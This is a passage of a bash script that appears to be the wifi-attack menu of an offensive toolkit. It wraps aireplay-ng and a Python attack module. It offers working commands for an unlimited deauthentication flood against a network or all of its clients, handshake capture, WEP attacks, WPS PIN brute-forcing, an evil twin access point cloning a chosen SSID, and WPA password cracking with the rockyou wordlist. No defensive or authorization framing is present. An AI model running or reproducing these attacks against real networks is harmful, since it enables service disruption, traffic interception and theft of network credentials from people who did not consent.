            echo -e "${Y}[*] Capturing handshake from $BSSID ch$CH${N}"
            sudo python3 "$MOD" handshake -i "$IFACE" -b "$BSSID" \
                -c "$CH" -e "${ESSID:-target}" -w "$WL" -o /tmp
            ;;

        deauth)
            check_root
            [ -z "$BSSID" ] && read -rp "  Target BSSID: " BSSID
            read -rp "  Client MAC (blank = broadcast all): " CLIENT
            echo -e "${Y}[*] Deauth flood → $BSSID${N}"
            if [ -n "$CLIENT" ]; then
                sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$CLIENT" "$IFACE"
            else
                sudo aireplay-ng --deauth 0 -a "$BSSID" "$IFACE"
            fi
            ;;

        wep)
            check_root
            read -rp "  Target BSSID: " BSSID
            read -rp "  Channel: " CH
            echo -e "${Y}[*] WEP attack on $BSSID ch$CH${N}"
            sudo python3 "$MOD" wep -i "$IFACE" -b "$BSSID" -c "$CH" -o /tmp
            ;;

        wps)
            check_root
            read -rp "  Target BSSID: " BSSID
            read -rp "  Channel: " CH
            echo -e "${Y}[*] WPS PIN brute-force on $BSSID${N}"
            sudo python3 "$MOD" wps -i "$IFACE" -b "$BSSID" -c "$CH" -o /tmp
            ;;

        evil_twin|eviltwin)
            check_root
            read -rp "  Clone SSID: " ESSID
            read -rp "  Channel [6]: " CH; CH="${CH:-6}"
            read -rp "  AP interface [$IFACE]: " API; API="${API:-$IFACE}"
            read -rp "  Monitor interface for deauth (blank = none): " MONI
            echo -e "${Y}[*] Evil twin AP: '$ESSID' ch$CH on $API${N}"
            if [ -n "$MONI" ]; then
                sudo python3 -c "
import sys; sys.path.insert(0,'$DIR/op/modules')
from wifi_attack import evil_twin
evil_twin('$API','$MONI','$ESSID',$CH)
"
            else
                sudo python3 -c "
import sys; sys.path.insert(0,'$DIR/op/modules')
from wifi_attack import evil_twin
evil_twin('$API',None,'$ESSID',$CH)
"
            fi
            ;;

        crack)
            read -rp "  Path to .cap file: " CAP
            read -rp "  BSSID (blank = auto): " BSSID
            read -rp "  Wordlist [/usr/share/wordlists/rockyou.txt]: " WL
            WL="${WL:-/usr/share/wordlists/rockyou.txt}"
            echo -e "${Y}[*] Cracking $CAP${N}"
            python3 "$MOD" crack -f "$CAP" ${BSSID:+-b "$BSSID"} -w "$WL"
            ;;

        *)
            echo "Usage: start wifi [auto|scan|pmkid|handshake|deauth|wep|wps|evil_twin|crack] [iface] [bssid]"
            ;;
    esac
}

